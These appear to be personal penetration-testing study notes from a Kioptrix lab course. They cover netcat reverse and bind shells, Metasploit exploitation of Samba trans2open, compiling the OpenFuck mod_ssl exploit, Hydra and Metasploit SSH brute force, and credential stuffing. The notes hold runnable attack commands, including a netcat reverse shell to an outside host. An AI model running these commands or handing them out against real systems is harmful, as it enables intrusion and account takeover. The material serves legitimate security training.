## Reverse Shell
reverse shell = a victim connects to us (95% of shells will be reverse)  
- `nc -nvlp 4444` *attacker listening*
- `nc 1.1.1.1 4444 -e /bin/sh` *target connecting*  
bind shell = we connect to target  
- scenario, we are doing external pen test, behind nat.. reverse shell would require port forwarding on firewall.. thus we use bind shell here  
- `nc -nvlp 4444 - /bin/sh` *target listening*
- `nc 1.1.1.1 4444` *attacker connecting*  

## Staged vs Non-staged Payloads  
#### Non-staged  
sends exploit shellcode all at once, larger in size and won't always work  
windows/meterpreter_reverse_tcp   *notice how meterpreter _ + payload are together*  
#### Staged  
sends payload in stages, can be less stable  
windows/meterpreter/reverse_tcp   *notice how meterpreter is separated from payload with*  
***
## Metasploit
searchsploit samba 2.2  
msfconsole  
search trans2open  
use exploit/linux/samba/trans2open   
options  
set RHOST 192.168.57.134  
options  
show targets  
run */exploit will also work*   
here, this exploit was *dieing/crashing*, so we need to use a different payload  
set payload linux/x86/shell_reverse_tcp  
Use tab-complete to make this easier  
run  
**Congratulations** you are now root!  

## Manual Exploitation  
In our Kioptrix enumeration, we found ModSSL being a vulnerability  
ExploitDB and google search, showed a exploit, OpenFuck..  
https://github.com/heltonWernik/OpenLuck  
git clone https://github.com/heltonWernik/OpenFuck.git  |  clone repo  
apt-get install libssl-dev  
gcc -o OpenFuck OpenFuck.c -lcrypto  | **COMPILE!**  
./OpenFuck  - *EXPLOIT*  
*check out the README.md for usages*  
https://kongwenbin.wordpress.com/tag/openfuck/  
https://medium.com/@javarmutt/how-to-compile-openfuckv2-c-69e457b4a1d1  
Usage: ./OpenFuck target box [port] [-c N]  
0x6b - RedHat Linux 7.2 (apache-1.3.20-16)  
./OpenFuck -0x6b 192.168.176.130 -c 40
                                                                       
## Brute Force Attacks  
hydra -l root -P /usr/share/wordlists/metasploit/unix_passwords.txt  ssh://192.168.176.130:22 -t 4 -V
[[HYDRA]]
### same thing with MSFCONSOLE
search ssh   
use  auxiliary/scanner/ssh/ssh_login  
options  
set RHOSTS 192.168.176.130  
set USERNAME root  
set PASS_FILE  /usr/share/wordlists/metasploit/unix_passwords.txt  
set VERBOSE true  

## Credential Stuffing  & Password Spraying
**#1 Heath gets in during assessment**  
Injecting breached account credentials in hopes of account takeover  
get leaked credentials from breaches  
Real life example : tesla breach parse  
Burpsuite *Pitchfork* for credential stuffing, *Sniper* for password spraying  
 